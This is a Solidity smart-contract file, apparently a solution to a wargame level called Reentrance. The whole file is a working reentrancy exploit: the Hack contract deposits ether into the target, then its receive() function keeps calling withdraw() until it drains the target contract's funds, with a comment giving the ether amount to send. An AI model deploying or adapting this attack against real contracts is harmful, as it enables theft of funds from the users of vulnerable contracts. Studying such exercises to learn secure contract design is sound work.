// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IReentrance {
    function balanceOf(address _who) external view returns (uint balance);

    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract Hack {
    IReentrance _Attack;

    constructor(address _address) {
        _Attack = IReentrance(_address);
    }

    receive() external payable {
        if (
            address(_Attack).balance > 0 &&
            address(_Attack).balance < _Attack.balanceOf(address(this))
        ) {
            _Attack.withdraw(address(_Attack).balance);
        } else {
            _Attack.withdraw(_Attack.balanceOf(address(this)));
        }
    }

    function attack() external payable {
        _Attack.donate{value: msg.value}(address(this));
    }

    // msg.value = 1000000000000000 wei

    function withDraw() external {
        _Attack.withdraw(_Attack.balanceOf(address(this)));
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
